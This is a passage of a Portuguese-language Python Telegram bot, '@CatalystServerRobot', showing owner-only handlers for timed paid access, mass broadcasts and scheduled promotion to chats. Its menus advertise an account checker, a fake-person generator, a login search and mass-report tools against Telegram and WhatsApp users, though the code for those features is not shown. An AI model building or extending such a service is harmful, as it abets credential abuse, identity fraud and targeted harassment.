        "🛠️ **FUNCIONALIDADES DISPONÍVEIS:**\n\n"
        "🌐 **SITES UPANDO**\n"
        "👤 **GERADOR DE PESSOA FAKE v2.0**\n"
            "🔐 **ACCOUNT CHECKER**\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🤖 @CatalystServerRobot",
        buttons=[
            [Button.inline("🌐 Sites Checker", data=f"sites_checker:{user_id}"),
             Button.inline("👤 Fake Person v2.0", data=f"fake_person:{user_id}")],
            [Button.inline("🔐 Account Checker", data=f"account_checker:{user_id}")],
            [Button.inline("🗑️ Cancelar", data=f"apagarmensagem:{user_id}")]
        ]
    )

# Handlers do sistema de divulgação (apenas para o dono)
@bot.on(events.NewMessage(pattern=r'^/on$'))
async def ativar_divulgacao(event):
    """Ativa o sistema de divulgação automática"""
    global divulgacao_ativa
    user_id = event.sender_id

    if not eh_dono(user_id):
        await event.reply("🚫 **Acesso negado!** Apenas o dono pode usar este comando.")
        return

    if not divulgacao_ativa and chats_autorizados:
        divulgacao_ativa = True
        # Criar task para divulgação em background
        asyncio.create_task(enviar_divulgacao())

        await event.reply(
            f"✅ **DIVULGAÇÃO AUTOMÁTICA ATIVADA!**\n\n"
            f"📊 **Configuração:**\n"
            f"• Chats autorizados: {len(chats_autorizados)}\n"
            f"• Intervalo: 20 minutos\n"
            f"• Status: Ativo\n\n"
            "🔄 Mensagens serão enviadas automaticamente."
        )
    elif divulgacao_ativa:
        await event.reply("⚠️ **A divulgação automática já está ativa.**")
    else:
        await event.reply("❌ **Nenhum chat autorizado!** Use `/addchat` primeiro.")

@bot.on(events.NewMessage(pattern=r'^/off$'))
async def desativar_divulgacao(event):
    """Desativa o sistema de divulgação automática"""
    global divulgacao_ativa
    user_id = event.sender_id

    if not eh_dono(user_id):
        await event.reply("🚫 **Acesso negado!** Apenas o dono pode usar este comando.")
        return

    if divulgacao_ativa:
        divulgacao_ativa = False
        await event.reply("✅ **DIVULGAÇÃO AUTOMÁTICA DESATIVADA.**")
    else:
        await event.reply("⚠️ **A divulgação automática já está desativada.**")

@bot.on(events.NewMessage(pattern=r'^/addchat (.+)'))
async def adicionar_chat(event):
    """Adiciona um chat à lista de divulgação"""
    user_id = event.sender_id

    if not eh_dono(user_id):
        await event.reply("🚫 **Acesso negado!** Apenas o dono pode usar este comando.")
        return

    chat_input = event.pattern_match.group(1)

    try:
        # Tentar obter informações do chat
        if chat_input.startswith('@'):
            chat_entity = await bot.get_entity(chat_input)
        elif chat_input.lstrip('-').isdigit():
            chat_entity = await bot.get_entity(int(chat_input))
        else:
            await event.reply("❌ **Formato inválido!** Use `@username` ou `ID numérico`")
            return

        chat_id = chat_entity.id
        chat_name = getattr(chat_entity, 'title', getattr(chat_entity, 'username', 'N/A'))

        # Verificar se o bot é admin (apenas para grupos/canais)
        if hasattr(chat_entity, 'broadcast') or hasattr(chat_entity, 'megagroup'):
            if not await bot_eh_admin(chat_id):
                await event.reply(f"⚠️ **Aviso:** O bot pode não ter permissão para enviar mensagens em **{chat_name}**")

        if chat_id not in chats_autorizados:
            chats_autorizados.append(chat_id)
            await event.reply(
                f"✅ **CHAT ADICIONADO COM SUCESSO!**\n\n"
                f"📋 **Informações:**\n"
                f"• Nome: {chat_name}\n"
                f"• ID: `{chat_id}`\n"
                f"• Total de chats: {len(chats_autorizados)}\n\n"
                "💡 Use `/on` para ativar a divulgação."
            )
        else:
            await event.reply(f"⚠️ **O chat {chat_name} já está na lista!**")

    except Exception as e:
        await event.reply(f"❌ **Erro ao adicionar chat:**\n`{str(e)[:100]}`")

@bot.on(events.NewMessage(pattern=r'^/removechat (.+)'))
async def remover_chat(event):
    """Remove um chat da lista de divulgação"""
    user_id = event.sender_id

    if not eh_dono(user_id):
        await event.reply("🚫 **Acesso negado!** Apenas o dono pode usar este comando.")
        return

    chat_input = event.pattern_match.group(1)

    try:
        if chat_input.startswith('@'):
            chat_entity = await bot.get_entity(chat_input)
            chat_id = chat_entity.id
        elif chat_input.lstrip('-').isdigit():
            chat_id = int(chat_input)
        else:
            await event.reply("❌ **Formato inválido!** Use `@username` ou `ID numérico`")
            return

        if chat_id in chats_autorizados:
            chats_autorizados.remove(chat_id)
            await event.reply(
                f"✅ **CHAT REMOVIDO COM SUCESSO!**\n\n"
                f"• ID removido: `{chat_id}`\n"
                f"• Chats restantes: {len(chats_autorizados)}"
            )
        else:
            await event.reply("❌ **Chat não encontrado na lista!**")

    except Exception as e:
        await event.reply(f"❌ **Erro ao remover chat:**\n`{str(e)[:100]}`")

@bot.on(events.NewMessage(pattern=r'^/listchats$'))
async def listar_chats(event):
    """Lista todos os chats autorizados para divulgação"""
    user_id = event.sender_id

    if not eh_dono(user_id):
        await event.reply("🚫 **Acesso negado!** Apenas o dono pode usar este comando.")
        return

    if not chats_autorizados:
        await event.reply("📋 **Lista vazia!** Nenhum chat autorizado para divulgação.")
        return

    message = f"📋 **CHATS AUTORIZADOS ({len(chats_autorizados)}):**\n\n"

    for i, chat_id in enumerate(chats_autorizados, 1):
        try:
            chat_info = await bot.get_entity(chat_id)
            chat_name = getattr(chat_info, 'title', getattr(chat_info, 'username', 'N/A'))
            message += f"{i}. **{chat_name}**\n   ID: `{chat_id}`\n\n"
        except:
            message += f"{i}. **Chat Desconhecido**\n   ID: `{chat_id}`\n\n"

    message += f"🔄 **Status:** {'🟢 Ativo' if divulgacao_ativa else '🔴 Inativo'}\n"
    message += f"⏰ **Intervalo:** 20 minutos"

    await event.reply(message)

@bot.on(events.NewMessage(pattern=r'^/divconfig$'))
async def config_divulgacao(event):
    """Mostra configurações do sistema de divulgação"""
    user_id = event.sender_id

    if not eh_dono(user_id):
        await event.reply("🚫 **Acesso negado!** Apenas o dono pode usar este comando.")
        return

    await event.reply(
        f"⚙️ **CONFIGURAÇÕES DE DIVULGAÇÃO**\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔄 **Status:** {'🟢 Ativo' if divulgacao_ativa else '🔴 Inativo'}\n"
        f"📊 **Chats autorizados:** {len(chats_autorizados)}\n"
        f"⏰ **Intervalo:** 20 minutos\n"
        f"👤 **Dono ID:** `{DONO_ID}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🛠️ **COMANDOS DISPONÍVEIS:**\n"
        "• `/on` - Ativar divulgação\n"
        "• `/off` - Desativar divulgação\n"
        "• `/addchat @canal` - Adicionar chat\n"
        "• `/removechat @canal` - Remover chat\n"
        "• `/listchats` - Listar chats\n"
        "• `/testdiv` - Teste de divulgação\n\n"
        "🤖 @CatalystServerRobot"
    )

@bot.on(events.NewMessage(pattern=r'^/testdiv$'))
async def testar_divulgacao(event):
    """Envia uma mensagem de teste para todos os chats"""
    user_id = event.sender_id

    if not eh_dono(user_id):
        await event.reply("🚫 **Acesso negado!** Apenas o dono pode usar este comando.")
        return

    if not chats_autorizados:
        await event.reply("❌ **Nenhum chat autorizado para teste!**")
        return

    await event.reply(f"🧪 **Iniciando teste em {len(chats_autorizados)} chats...**")

    sucessos = 0
    falhas = 0

    mensagem_teste = f"🧪 **TESTE DE DIVULGAÇÃO - CATALYST SERVER**\n\n✅ Sistema funcionando perfeitamente!\n🤖 @CatalystServerRobot"

    for chat_id in chats_autorizados:
        try:
            await bot.send_message(chat_id, mensagem_teste, parse_mode='md')
            sucessos += 1
        except Exception as e:
            falhas += 1
            print(f"❌ Erro no teste para {chat_id}: {e}")

    await event.reply(
        f"📊 **RESULTADO DO TESTE:**\n\n"
        f"✅ **Sucessos:** {sucessos}\n"
        f"❌ **Falhas:** {falhas}\n"
        f"📊 **Total:** {len(chats_autorizados)}\n\n"
        f"🎯 **Taxa de sucesso:** {(sucessos/len(chats_autorizados)*100):.1f}%"
    )

# Comandos de gerenciamento de autorização (apenas para o dono)
@bot.on(events.NewMessage(pattern=r'^/autorizar (\d+)$'))
async def autorizar_usuario(event):
    """Autoriza um usuário a usar o bot permanentemente"""
    user_id = event.sender_id

    if not eh_dono(user_id):
        await event.reply("🚫 **Acesso negado!** Apenas o dono pode usar este comando.")
        return

    target_id = int(event.pattern_match.group(1))

    if target_id in usuarios_autorizados_sistema:
        await event.reply(f"⚠️ **Usuário {target_id} já está autorizado!**")
        return

    usuarios_autorizados_sistema.add(target_id)

    # Atualizar/inserir no banco sem data de expiração (permanente)
    try:
        cursor.execute("SELECT id FROM usuarios WHERE id = ?", (target_id,))
        if cursor.fetchone():
            cursor.execute("UPDATE usuarios SET data_expiracao = NULL, admin = 'yes' WHERE id = ?", (target_id,))
        else:
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            cursor.execute(
                "INSERT INTO usuarios (id, nome, sobrenome, hash, data_criada, data_expiracao, admin) VALUES (?, ?, ?, ?, ?, ?, ?)",
                (target_id, "N/A", "N/A", hashlib.md5(str(target_id).encode()).hexdigest()[:8], now, None, "yes")
            )
        conn.commit()
    except Exception as e:
        print(f"❌ Erro ao atualizar banco: {e}")

    try:
        # Tentar obter informações do usuário
        user_info = await bot.get_entity(target_id)
        user_name = getattr(user_info, 'first_name', 'Usuário')

        await event.reply(
            f"✅ **USUÁRIO AUTORIZADO COM SUCESSO!**\n\n"
            f"👤 **Nome:** {user_name}\n"
            f"🆔 **ID:** `{target_id}`\n"
            f"⏰ **Tempo:** Permanente\n"
            f"📊 **Total de autorizados:** {len(usuarios_autorizados_sistema)}"
        )

        # Notificar o usuário autorizado
        try:
            await bot.send_message(
                target_id,
                "🎉 **PARABÉNS! VOCÊ FOI AUTORIZADO!**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "✅ Agora você pode usar todas as funcionalidades do bot!\n\n"
                "⏰ **Acesso:** Permanente\n\n"
                "🚀 **Digite /start para começar**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🤖 @CatalystServerRobot"
            )
        except:
            pass

    except Exception as e:
        await event.reply(f"✅ **Usuário {target_id} autorizado!** (Não foi possível obter mais informações)")

@bot.on(events.NewMessage(pattern=r'^/autorizar (\d+) (\d+)([dhm])$'))
async def autorizar_usuario_tempo(event):
    """Autoriza um usuário a usar o bot por um tempo específico"""
    user_id = event.sender_id

    if not eh_dono(user_id):
        await event.reply("🚫 **Acesso negado!** Apenas o dono pode usar este comando.")
        return

    target_id = int(event.pattern_match.group(1))
    quantidade = int(event.pattern_match.group(2))
    unidade = event.pattern_match.group(3)

    # Calcular data de expiração
    agora = datetime.now()

    if unidade == 'm':  # minutos
        data_expiracao = agora + timedelta(minutes=quantidade)
        tempo_texto = f"{quantidade} minuto{'s' if quantidade > 1 else ''}"
    elif unidade == 'h':  # horas
        data_expiracao = agora + timedelta(hours=quantidade)
        tempo_texto = f"{quantidade} hora{'s' if quantidade > 1 else ''}"
    elif unidade == 'd':  # dias
        data_expiracao = agora + timedelta(days=quantidade)
        tempo_texto = f"{quantidade} dia{'s' if quantidade > 1 else ''}"

    usuarios_autorizados_sistema.add(target_id)

    # Atualizar/inserir no banco com data de expiração
    try:
        cursor.execute("SELECT id FROM usuarios WHERE id = ?", (target_id,))
        if cursor.fetchone():
            cursor.execute("UPDATE usuarios SET data_expiracao = ? WHERE id = ?", 
                         (data_expiracao.strftime("%Y-%m-%d %H:%M:%S"), target_id))
        else:
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            cursor.execute(
                "INSERT INTO usuarios (id, nome, sobrenome, hash, data_criada, data_expiracao) VALUES (?, ?, ?, ?, ?, ?)",
                (target_id, "N/A", "N/A", hashlib.md5(str(target_id).encode()).hexdigest()[:8], now, data_expiracao.strftime("%Y-%m-%d %H:%M:%S"))
            )
        conn.commit()
    except Exception as e:
        print(f"❌ Erro ao atualizar banco: {e}")

    try:
        # Tentar obter informações do usuário
        user_info = await bot.get_entity(target_id)
        user_name = getattr(user_info, 'first_name', 'Usuário')

        await event.reply(
            f"✅ **USUÁRIO AUTORIZADO COM TEMPO!**\n\n"
            f"👤 **Nome:** {user_name}\n"
            f"🆔 **ID:** `{target_id}`\n"
            f"⏰ **Tempo:** {tempo_texto}\n"
            f"📅 **Expira em:** {data_expiracao.strftime('%d/%m/%Y às %H:%M')}\n"
            f"📊 **Total de autorizados:** {len(usuarios_autorizados_sistema)}"
        )

        # Notificar o usuário autorizado
        try:
            await bot.send_message(
                target_id,
                f"🎉 **PARABÉNS! VOCÊ FOI AUTORIZADO!**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "✅ Agora você pode usar todas as funcionalidades do bot!\n\n"
                f"⏰ **Tempo de acesso:** {tempo_texto}\n"
                f"📅 **Expira em:** {data_expiracao.strftime('%d/%m/%Y às %H:%M')}\n\n"
                "🚀 **Digite /start para começar**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🤖 @CatalystServerRobot"
            )
        except:
            pass

    except Exception as e:
        await event.reply(f"✅ **Usuário {target_id} autorizado por {tempo_texto}!**")

@bot.on(events.NewMessage(pattern=r'^/desautorizar (\d+)$'))
async def desautorizar_usuario(event):
    """Remove autorização de um usuário"""
    user_id = event.sender_id

    if not eh_dono(user_id):
        await event.reply("🚫 **Acesso negado!** Apenas o dono pode usar este comando.")
        return

    target_id = int(event.pattern_match.group(1))

    if target_id == DONO_ID:
        await event.reply("❌ **Não é possível remover autorização do dono!**")
        return

    if target_id not in usuarios_autorizados_sistema:
        await event.reply(f"⚠️ **Usuário {target_id} não está autorizado!**")
        return

    usuarios_autorizados_sistema.remove(target_id)

    # Atualizar banco de dados
    try:
        cursor.execute("UPDATE usuarios SET admin = 'no', data_expiracao = datetime('now', '-1 day') WHERE id = ?", (target_id,))
        conn.commit()
    except Exception as e:
        print(f"❌ Erro ao atualizar banco: {e}")

    await event.reply(
        f"✅ **AUTORIZAÇÃO REMOVIDA!**\n\n"
        f"🆔 **ID removido:** `{target_id}`\n"
        f"📊 **Total de autorizados:** {len(usuarios_autorizados_sistema)}"
    )

    # Notificar o usuário desautorizado
    try:
        await bot.send_message(
            target_id,
            "🚫 **SUA AUTORIZAÇÃO FOI REMOVIDA**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "❌ Você não pode mais usar este bot.\n\n"
            "💡 Entre em contato com o administrador se precisar de acesso novamente.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot"
        )
    except:
        pass

@bot.on(events.NewMessage(pattern=r'^/listautorizados$'))
async def listar_autorizados(event):
    """Lista todos os usuários autorizados com tempo de expiração"""
    user_id = event.sender_id

    if not eh_dono(user_id):
        await event.reply("🚫 **Acesso negado!** Apenas o dono pode usar este comando.")
        return

    if not usuarios_autorizados_sistema:
        await event.reply("📋 **Lista vazia!** Nenhum usuário autorizado.")
        return

    message = f"👥 **USUÁRIOS AUTORIZADOS ({len(usuarios_autorizados_sistema)}):**\n\n"

    for i, user_id_auth in enumerate(usuarios_autorizados_sistema, 1):
        try:
            user_info = await bot.get_entity(user_id_auth)
            user_name = getattr(user_info, 'first_name', 'N/A')
            username = getattr(user_info, 'username', None)

            # Buscar data de expiração no banco
            cursor.execute("SELECT data_expiracao FROM usuarios WHERE id = ?", (user_id_auth,))
            result = cursor.fetchone()

            message += f"{i}. **{user_name}**"
            if username:
                message += f" (@{username})"
            message += f"\n   ID: `{user_id_auth}`"

            if result and result[0]:
                data_expiracao = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
                agora = datetime.now()

                if agora > data_expiracao:
                    message += "\n   ⏰ **Status:** 🔴 EXPIRADO"
                else:
                    tempo_restante = data_expiracao - agora
                    dias = tempo_restante.days
                    horas = tempo_restante.seconds // 3600
                    minutos = (tempo_restante.seconds % 3600) // 60

                    if dias > 0:
                        message += f"\n   ⏰ **Expira em:** {dias}d {horas}h {minutos}m"
                    elif horas > 0:
                        message += f"\n   ⏰ **Expira em:** {horas}h {minutos}m"
                    else:
                        message += f"\n   ⏰ **Expira em:** {minutos}m"
            else:
                message += "\n   ⏰ **Status:** ♾️ PERMANENTE"

            if user_id_auth == DONO_ID:
                message += " 👑"
            message += "\n\n"
        except Exception as e:
            message += f"{i}. **Usuário Desconhecido**\n   ID: `{user_id_auth}`"
            if user_id_auth == DONO_ID:
                message += " 👑"
            message += "\n\n"

    await event.reply(message)

@bot.on(events.NewMessage(pattern=r'^/estender (\d+) (\d+)([dhm])$'))
async def estender_tempo_usuario(event):
    """Estende o tempo de autorização de um usuário"""
    user_id = event.sender_id

    if not eh_dono(user_id):
        await event.reply("🚫 **Acesso negado!** Apenas o dono pode usar este comando.")
        return

    target_id = int(event.pattern_match.group(1))
    quantidade = int(event.pattern_match.group(2))
    unidade = event.pattern_match.group(3)

    if target_id not in usuarios_autorizados_sistema:
        await event.reply(f"❌ **Usuário {target_id} não está autorizado!**")
        return

    # Buscar data de expiração atual
    cursor.execute("SELECT data_expiracao FROM usuarios WHERE id = ?", (target_id,))
    result = cursor.fetchone()

    if not result or not result[0]:
        await event.reply(f"⚠️ **Usuário {target_id} tem acesso permanente!** Use `/autorizar {target_id} [tempo]` para definir tempo.")
        return

    # Calcular nova data de expiração
    data_atual = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
    agora = datetime.now()

    # Se já expirou, estender a partir de agora
    if data_atual < agora:
        base_data = agora
    else:
        base_data = data_atual

    if unidade == 'm':  # minutos
        nova_data = base_data + timedelta(minutes=quantidade)
        tempo_texto = f"{quantidade} minuto{'s' if quantidade > 1 else ''}"
    elif unidade == 'h':  # horas
        nova_data = base_data + timedelta(hours=quantidade)
        tempo_texto = f"{quantidade} hora{'s' if quantidade > 1 else ''}"
    elif unidade == 'd':  # dias
        nova_data = base_data + timedelta(days=quantidade)
        tempo_texto = f"{quantidade} dia{'s' if quantidade > 1 else ''}"

    # Atualizar banco
    try:
        cursor.execute("UPDATE usuarios SET data_expiracao = ? WHERE id = ?", 
                     (nova_data.strftime("%Y-%m-%d %H:%M:%S"), target_id))
        conn.commit()

        # Readicionar à lista de autorizados se estava expirado
        usuarios_autorizados_sistema.add(target_id)

        await event.reply(
            f"✅ **TEMPO ESTENDIDO COM SUCESSO!**\n\n"
            f"🆔 **ID:** `{target_id}`\n"
            f"⏰ **Tempo adicionado:** {tempo_texto}\n"
            f"📅 **Nova expiração:** {nova_data.strftime('%d/%m/%Y às %H:%M')}\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot"
        )

        # Notificar o usuário
        try:
            await bot.send_message(
                target_id,
                f"⏰ **SEU TEMPO FOI ESTENDIDO!**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"➕ **Tempo adicionado:** {tempo_texto}\n"
                f"📅 **Nova expiração:** {nova_data.strftime('%d/%m/%Y às %H:%M')}\n\n"
                "✅ Continue aproveitando o bot!\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🤖 @CatalystServerRobot"
            )
        except:
            pass

    except Exception as e:
        await event.reply(f"❌ **Erro ao estender tempo:** {str(e)}")

@bot.on(events.NewMessage(pattern=r'^/authstatus$'))
async def status_autorizacao(event):
    """Mostra status do sistema de autorização"""
    user_id = event.sender_id

    if not eh_dono(user_id):
        await event.reply("🚫 **Acesso negado!** Apenas o dono pode usar este comando.")
        return

    # Contar usuários com diferentes tipos de acesso
    permanentes = 0
    temporarios = 0
    expirados = 0

    for user_id_auth in usuarios_autorizados_sistema:
        cursor.execute("SELECT data_expiracao FROM usuarios WHERE id = ?", (user_id_auth,))
        result = cursor.fetchone()

        if not result or not result[0]:
            permanentes += 1
        else:
            data_expiracao = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
            if datetime.now() > data_expiracao:
                expirados += 1
            else:
                temporarios += 1

    await event.reply(
        f"🔐 **STATUS DO SISTEMA DE AUTORIZAÇÃO**\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👥 **Total de usuários:** {len(usuarios_autorizados_sistema)}\n"
        f"♾️ **Permanentes:** {permanentes}\n"
        f"⏰ **Temporários ativos:** {temporarios}\n"
        f"🔴 **Expirados:** {expirados}\n"
        f"👑 **Dono ID:** `{DONO_ID}`\n"
        f"✅ **Sistema ativo:** Sim\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🛠️ **COMANDOS DISPONÍVEIS:**\n"
        "• `/autorizar [ID]` - Autorizar permanente\n"
        "• `/autorizar [ID] [tempo][d/h/m]` - Autorizar temporário\n"
        "• `/estender [ID] [tempo][d/h/m]` - Estender tempo\n"
        "• `/desautorizar [ID]` - Remover autorização\n"
        "• `/listautorizados` - Listar autorizados\n"
        "• `/authstatus` - Ver este status\n\n"
        "💡 **Exemplos:**\n"
        "• `/autorizar 123456789 30d` - 30 dias\n"
        "• `/autorizar 123456789 12h` - 12 horas\n"
        "• `/autorizar 123456789 60m` - 60 minutos\n"
        "• `/estender 123456789 7d` - Adicionar 7 dias\n\n"
        "🤖 @CatalystServerRobot"
    )

@bot.on(events.NewMessage(pattern=r'^/broadcast (.+)'))
async def broadcast_handler(event):
    """Envia mensagem para todos os usuários registrados"""
    user_id = event.sender_id

    if not eh_dono(user_id):
        await event.reply("🚫 **Acesso negado!** Apenas o dono pode usar este comando.")
        return

    mensagem = event.pattern_match.group(1)

    # Obter todos os usuários do banco
    cursor.execute("SELECT id FROM usuarios")
    usuarios = cursor.fetchall()

    if not usuarios:
        await event.reply("❌ **Nenhum usuário encontrado no banco de dados!**")
        return

    # Confirmar antes de enviar
    await event.reply(
        f"📢 **CONFIRMAÇÃO DE BROADCAST**\n\n"
        f"📝 **Mensagem:**\n{mensagem[:200]}{'...' if len(mensagem) > 200 else ''}\n\n"
        f"👥 **Destinatários:** {len(usuarios)} usuários\n\n"
        "⚠️ **Tem certeza que deseja enviar?**",
        buttons=[
            [Button.inline("✅ Confirmar Envio", data=f"confirm_broadcast:{user_id}")],
            [Button.inline("❌ Cancelar", data=f"cancel_broadcast:{user_id}")]
        ]
    )

    # Armazenar mensagem temporariamente
    globals()[f'broadcast_message_{user_id}'] = mensagem
    globals()[f'broadcast_users_{user_id}'] = usuarios

@bot.on(events.NewMessage(pattern=r'^/broadcastauth (.+)'))
async def broadcast_auth_handler(event):
    """Envia mensagem apenas para usuários autorizados"""
    user_id = event.sender_id

    if not eh_dono(user_id):
        await event.reply("🚫 **Acesso negado!** Apenas o dono pode usar este comando.")
        return

    mensagem = event.pattern_match.group(1)

    # Obter apenas usuários autorizados
    usuarios_auth = list(usuarios_autorizados_sistema)

    if not usuarios_auth:
        await event.reply("❌ **Nenhum usuário autorizado encontrado!**")
        return

    # Confirmar antes de enviar
    await event.reply(
        f"📢 **CONFIRMAÇÃO DE BROADCAST (AUTORIZADOS)**\n\n"
        f"📝 **Mensagem:**\n{mensagem[:200]}{'...' if len(mensagem) > 200 else ''}\n\n"
        f"👥 **Destinatários:** {len(usuarios_auth)} usuários autorizados\n\n"
        "⚠️ **Tem certeza que deseja enviar?**",
        buttons=[
            [Button.inline("✅ Confirmar Envio", data=f"confirm_broadcast_auth:{user_id}")],
            [Button.inline("❌ Cancelar", data=f"cancel_broadcast:{user_id}")]
        ]
    )

    # Armazenar dados temporariamente
    globals()[f'broadcast_message_{user_id}'] = mensagem
    globals()[f'broadcast_users_auth_{user_id}'] = [(user_id,) for user_id in usuarios_auth]

async def executar_broadcast(user_id, usuarios_lista, mensagem, tipo="geral"):
    """Executa o envio do broadcast"""
    enviados = 0
    falhas = 0
    bloqueados = 0

    # Mensagem de status inicial
    status_msg = await bot.send_message(
        user_id,
        f"📢 **INICIANDO BROADCAST {tipo.upper()}**\n\n"
        f"👥 **Total de usuários:** {len(usuarios_lista)}\n"
        f"📤 **Enviados:** 0\n"
        f"❌ **Falhas:** 0\n"
        f"🚫 **Bloqueados:** 0\n\n"
        "⏳ **Enviando mensagens...**"
    )

    for i, (target_user_id,) in enumerate(usuarios_lista):
        try:
            # Pular o próprio dono
            if target_user_id == user_id:
                continue

            await bot.send_message(target_user_id, mensagem, parse_mode='md')
            enviados += 1

            # Atualizar status a cada 10 mensagens
            if (i + 1) % 10 == 0:
                try:
                    await status_msg.edit(
                        f"📢 **BROADCAST {tipo.upper()} EM ANDAMENTO**\n\n"
                        f"👥 **Total de usuários:** {len(usuarios_lista)}\n"
                        f"📤 **Enviados:** {enviados}\n"
                        f"❌ **Falhas:** {falhas}\n"
                        f"🚫 **Bloqueados:** {bloqueados}\n\n"
                        f"📊 **Progresso:** {i+1}/{len(usuarios_lista)} ({((i+1)/len(usuarios_lista)*100):.1f}%)\n\n"
                        "⏳ **Enviando mensagens...**"
                    )
                except:
                    pass

            # Delay para evitar spam
            await asyncio.sleep(0.1)

        except Exception as e:
            if "blocked" in str(e).lower() or "user is deactivated" in str(e).lower():
                bloqueados += 1
            else:
                falhas += 1
            
            print(f"❌ Erro ao enviar para {target_user_id}: {e}")

    # Mensagem final
    try:
        await status_msg.edit(
            f"✅ **BROADCAST {tipo.upper()} CONCLUÍDO!**\n\n"
            f"👥 **Total de usuários:** {len(usuarios_lista)}\n"
            f"📤 **Enviados com sucesso:** {enviados}\n"
            f"❌ **Falhas de envio:** {falhas}\n"
            f"🚫 **Usuários bloqueados:** {bloqueados}\n\n"
            f"🎯 **Taxa de sucesso:** {(enviados/len(usuarios_lista)*100):.1f}%\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot"
        )
    except:
        pass

# Função principal
async def main():
    print("🤖 Iniciando bot...")

    # Inicializar banco de dados de pessoas
    print("🔄 Inicializando banco de dados...")
    init_pessoa_database()
    print("✅ Banco de dados inicializado!")

    try:
        # Inicializar o cliente com o token do bot
        await bot.start(bot_token=bot_token)
        print("✅ Bot conectado com sucesso!")

        print(
            f"🤖 Funcionalidades disponíveis:\n"
            f"• /start - Iniciar bot\n"
            f"• /ping - Verificar status do bot\n"
            f"• /search [url] - Buscar logins\n"
            f"• /webscraper [url] - Extrair dados do site\n"
            f"• /report - Enviar reports Telegram\n"
            f"• /report2 - Sistema avançado de reports\n"
            f"• /reportwpp - Reportar números WhatsApp\n"
            f"• /reset - Resetar dados\n"
            f"• /checker - Ferramentas Checker v3.0\n"
            f"• /geradores - Ferramentas de Geração v3.0\n"
            f"• /comandos - Ver todos os comandos\n\n"
        )
        print("🎯 NOVO: Gerador de pessoas com banco de dados real!")
        print("📊 Milhões de combinações possíveis!")
        print("\n⚡ Bot aguardando mensagens...")

        # Manter o bot rodando
        await bot.run_until_disconnected()

    except KeyboardInterrupt:
        print("\n👋 Bot finalizado pelo usuário")
    except Exception as e:
        print(f"❌ Erro crítico: {e}")
    finally:
        try:
            await bot.disconnect()
        except:
            pass
        
        # Fechar conexões do banco
        try:
            if 'cursor' in globals():
                cursor.close()
            if 'conn' in globals():
                conn.close()
            print("✅ Conexões do banco fechadas")
        except Exception as e:
            print(f"⚠️ Erro ao fechar banco: {e}")

if __name__ == "__main__":
    asyncio.run(main())